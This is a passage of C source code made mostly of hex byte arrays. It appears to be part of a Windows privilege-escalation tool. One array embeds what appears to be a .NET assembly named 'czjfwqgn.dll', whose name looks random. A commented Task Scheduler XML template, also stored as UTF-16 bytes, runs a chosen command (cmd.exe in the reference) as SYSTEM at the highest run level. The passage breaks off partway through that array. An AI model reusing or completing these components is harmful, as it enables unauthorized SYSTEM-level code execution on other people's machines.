	0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x00, 0x00, 0x00, 0x58, 0x40, 0x00, 0x00, 0x4C, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x02, 0x34, 0x00, 0x00, 0x00, 0x56, 0x00, 0x53, 0x00, 0x5F,
	0x00, 0x56, 0x00, 0x45, 0x00, 0x52, 0x00, 0x53, 0x00, 0x49, 0x00, 0x4F, 0x00, 0x4E, 0x00, 0x5F,
	0x00, 0x49, 0x00, 0x4E, 0x00, 0x46, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBD, 0x04, 0xEF,
	0xFE, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x56, 0x00, 0x61, 0x00, 0x72, 0x00, 0x46, 0x00, 0x69,
	0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x24, 0x00, 0x04, 0x00, 0x00, 0x00, 0x54, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x73,
	0x00, 0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0xB0, 0x04, 0xAC, 0x01, 0x00, 0x00, 0x01, 0x00, 0x53, 0x00, 0x74, 0x00, 0x72,
	0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49,
	0x00, 0x6E, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x88, 0x01, 0x00, 0x00, 0x01, 0x00, 0x30,
	0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x34, 0x00, 0x62, 0x00, 0x30, 0x00, 0x00,
	0x00, 0x2C, 0x00, 0x02, 0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x44,
	0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69,
	0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x30, 0x00, 0x08,
	0x00, 0x01, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72,
	0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x2E,
	0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x0D,
	0x00, 0x01, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x61,
	0x00, 0x6C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x63, 0x00, 0x7A,
	0x00, 0x6A, 0x00, 0x66, 0x00, 0x77, 0x00, 0x71, 0x00, 0x67, 0x00, 0x6E, 0x00, 0x2E, 0x00, 0x64,
	0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x02, 0x00, 0x01, 0x00, 0x4C,
	0x00, 0x65, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x79,
	0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
	0x00, 0x44, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x4F, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x69,
	0x00, 0x6E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x6E,
	0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00, 0x63, 0x00, 0x7A, 0x00, 0x6A, 0x00, 0x66,
	0x00, 0x77, 0x00, 0x71, 0x00, 0x67, 0x00, 0x6E, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x08, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6F,
	0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73,
	0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E,
	0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00, 0x38, 0x00, 0x08, 0x00, 0x01, 0x00, 0x41,
	0x00, 0x73, 0x00, 0x73, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x62, 0x00, 0x6C, 0x00, 0x79, 0x00, 0x20,
	0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00,
	0x00, 0x0C, 0x00, 0x00, 0x00, 0xB0, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x57, 0x00,
	0x00, 0x00, 0x0B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x47, 0x75, 0x69, 0x64, 0x0B, 0x00,
	0x00, 0x00, 0x02, 0x5F, 0x61, 0x02, 0x5F, 0x62, 0x02, 0x5F, 0x63, 0x02, 0x5F, 0x64, 0x02, 0x5F,
	0x65, 0x02, 0x5F, 0x66, 0x02, 0x5F, 0x67, 0x02, 0x5F, 0x68, 0x02, 0x5F, 0x69, 0x02, 0x5F, 0x6A,
	0x02, 0x5F, 0x6B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x07,
	0x07, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x13, 0x13, 0xD2, 0x74, 0xEE, 0x2A, 0xD1,
	0x11, 0x8B, 0xFB, 0x00, 0xA0, 0xC9, 0x0F, 0x26, 0xF7, 0x0B, 0x0B
};

/*
* g_encodedTaskParamBegin/g_encodedTaskParamEnd

Reference = L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\
<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\
  <RegistrationInfo>\
	<Description>Test Task</Description>\
  </RegistrationInfo>\
  <Triggers />\
  <Principals>\
	<Principal id=\"Author\">\
	  <UserId>SYSTEM</UserId>\
	  <RunLevel>HighestAvailable</RunLevel>\
	</Principal>\
  </Principals>\
  <Settings>\
	<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\
	<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\
	<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\
	<AllowHardTerminate>true</AllowHardTerminate>\
	<StartWhenAvailable>false</StartWhenAvailable>\
	<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\
	<IdleSettings>\
	  <Duration>PT10M</Duration>\
	  <WaitTimeout>PT1H</WaitTimeout>\
	  <StopOnIdleEnd>true</StopOnIdleEnd>\
	  <RestartOnIdle>false</RestartOnIdle>\
	</IdleSettings>\
	<AllowStartOnDemand>true</AllowStartOnDemand>\
	<Enabled>true</Enabled>\
	<Hidden>false</Hidden>\
	<RunOnlyIfIdle>false</RunOnlyIfIdle>\
	<UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>\
	<WakeToRun>false</WakeToRun>\
	<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\
	<Priority>7</Priority>\
  </Settings>\
  <Actions Context=\"Author\">\
	<Exec>\
	  <Command>cmd.exe</Command>\
	</Exec>\
  </Actions>\
</Task>";

g_encodedTaskParamBegin = L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\
<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\
<RegistrationInfo>\
<Description>Test Task</Description>\
</RegistrationInfo>\
<Triggers />\
<Principals>\
<Principal id=\"Author\">\
<UserId>SYSTEM</UserId>\
<RunLevel>HighestAvailable</RunLevel>\
</Principal>\
</Principals>\
<Settings>\
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\
<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\
<AllowHardTerminate>true</AllowHardTerminate>\
<StartWhenAvailable>false</StartWhenAvailable>\
<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\
<IdleSettings>\
<Duration>PT10M</Duration>\
<WaitTimeout>PT1H</WaitTimeout>\
<StopOnIdleEnd>true</StopOnIdleEnd>\
<RestartOnIdle>false</RestartOnIdle>\
</IdleSettings>\
<AllowStartOnDemand>true</AllowStartOnDemand>\
<Enabled>true</Enabled>\
<Hidden>false</Hidden>\
<RunOnlyIfIdle>false</RunOnlyIfIdle>\
<UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>\
<WakeToRun>false</WakeToRun>\
<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\
<Priority>7</Priority>\
</Settings>\
<Actions Context=\"Author\">\
<Exec>\
<Command>";

g_encodedTaskParamEnd = L"</Command>\
</Exec>\
</Actions>\
</Task>";

*/

static const unsigned char g_encodedTaskParamBegin[2308] = {
	0x3C, 0x00, 0x3F, 0x00, 0x78, 0x00, 0x6D, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x76, 0x00, 0x65, 0x00,
	0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x31, 0x00,
	0x2E, 0x00, 0x30, 0x00, 0x22, 0x00, 0x20, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x6F, 0x00,
	0x64, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x55, 0x00, 0x54, 0x00,
	0x46, 0x00, 0x2D, 0x00, 0x31, 0x00, 0x36, 0x00, 0x22, 0x00, 0x3F, 0x00, 0x3E, 0x00, 0x3C, 0x00,
	0x54, 0x00, 0x61, 0x00, 0x73, 0x00, 0x6B, 0x00, 0x20, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00,
	0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x31, 0x00, 0x2E, 0x00,
	0x33, 0x00, 0x22, 0x00, 0x20, 0x00, 0x78, 0x00, 0x6D, 0x00, 0x6C, 0x00, 0x6E, 0x00, 0x73, 0x00,
	0x3D, 0x00, 0x22, 0x00, 0x68, 0x00, 0x74, 0x00, 0x74, 0x00, 0x70, 0x00, 0x3A, 0x00, 0x2F, 0x00,
	0x2F, 0x00, 0x73, 0x00, 0x63, 0x00, 0x68, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x73, 0x00,
	0x2E, 0x00, 0x6D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00,
	0x66, 0x00, 0x74, 0x00, 0x2E, 0x00, 0x63, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x2F, 0x00, 0x77, 0x00,
	0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x2F, 0x00, 0x32, 0x00,
	0x30, 0x00, 0x30, 0x00, 0x34, 0x00, 0x2F, 0x00, 0x30, 0x00, 0x32, 0x00, 0x2F, 0x00, 0x6D, 0x00,
	0x69, 0x00, 0x74, 0x00, 0x2F, 0x00, 0x74, 0x00, 0x61, 0x00, 0x73, 0x00, 0x6B, 0x00, 0x22, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x52, 0x00, 0x65, 0x00, 0x67, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 0x00,
	0x72, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x49, 0x00, 0x6E, 0x00,
	0x66, 0x00, 0x6F, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00,
	0x72, 0x00, 0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3E, 0x00,
	0x54, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x20, 0x00, 0x54, 0x00, 0x61, 0x00, 0x73, 0x00,
	0x6B, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x44, 0x00, 0x65, 0x00, 0x73, 0x00, 0x63, 0x00, 0x72, 0x00,
	0x69, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x3E, 0x00, 0x3C, 0x00,
	0x2F, 0x00, 0x52, 0x00, 0x65, 0x00, 0x67, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 0x00, 0x72, 0x00,
	0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x66, 0x00,
	0x6F, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x54, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x67, 0x00,
	0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x50, 0x00,
	0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x69, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6C, 0x00,
	0x73, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x50, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x63, 0x00,
	0x69, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x69, 0x00, 0x64, 0x00, 0x3D, 0x00,
	0x22, 0x00, 0x41, 0x00, 0x75, 0x00, 0x74, 0x00, 0x68, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x22, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x49, 0x00, 0x64, 0x00,
	0x3E, 0x00, 0x53, 0x00, 0x59, 0x00, 0x53, 0x00, 0x54, 0x00, 0x45, 0x00, 0x4D, 0x00, 0x3C, 0x00,
	0x2F, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x49, 0x00, 0x64, 0x00, 0x3E, 0x00,
	0x3C, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00, 0x4C, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00,
	0x6C, 0x00, 0x3E, 0x00, 0x48, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x65, 0x00, 0x73, 0x00,
	0x74, 0x00, 0x41, 0x00, 0x76, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x62, 0x00,
	0x6C, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6E, 0x00, 0x4C, 0x00,
	0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x50, 0x00,
	0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x69, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6C, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x50, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x63, 0x00,
	0x69, 0x00, 0x70, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x73, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x53, 0x00,
	0x65, 0x00, 0x74, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x73, 0x00, 0x3E, 0x00,
	0x3C, 0x00, 0x4D, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x74, 0x00, 0x69, 0x00, 0x70, 0x00, 0x6C, 0x00,
	0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x74, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x63, 0x00,
	0x65, 0x00, 0x73, 0x00, 0x50, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x63, 0x00, 0x79, 0x00,
	0x3E, 0x00, 0x49, 0x00, 0x67, 0x00, 0x6E, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x65, 0x00, 0x4E, 0x00,
	0x65, 0x00, 0x77, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x4D, 0x00, 0x75, 0x00, 0x6C, 0x00, 0x74, 0x00,
	0x69, 0x00, 0x70, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x74, 0x00,
	0x61, 0x00, 0x6E, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x50, 0x00, 0x6F, 0x00, 0x6C, 0x00,
	0x69, 0x00, 0x63, 0x00, 0x79, 0x00, 0x3E, 0x00, 0x3C, 0x00, 0x44, 0x00, 0x69, 0x00, 0x73, 0x00,
	0x61, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x53, 0x00, 0x74, 0x00, 0x61, 0x00,
	0x72, 0x00, 0x74, 0x00, 0x49, 0x00, 0x66, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x42, 0x00, 0x61, 0x00,
	0x74, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 0x73, 0x00, 0x3E, 0x00,
	0x74, 0x00, 0x72, 0x00, 0x75, 0x00, 0x65, 0x00, 0x3C, 0x00, 0x2F, 0x00, 0x44, 0x00, 0x69, 0x00,
	0x73, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x53, 0x00, 0x74, 0x00,
	0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x49, 0x00, 0x66, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x42, 0x00,
	0x61, 0x00, 0x74, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 0x73, 0x00,
	0x3E, 0x00, 0x3C, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x49, 0x00, 0x66, 0x00,
	0x47, 0x00, 0x6F, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x4F, 0x00, 0x6E, 0x00, 0x42, 0x00,
	0x61, 0x00, 0x74, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x69, 0x00, 0x65, 0x00, 0x73, 0x00,
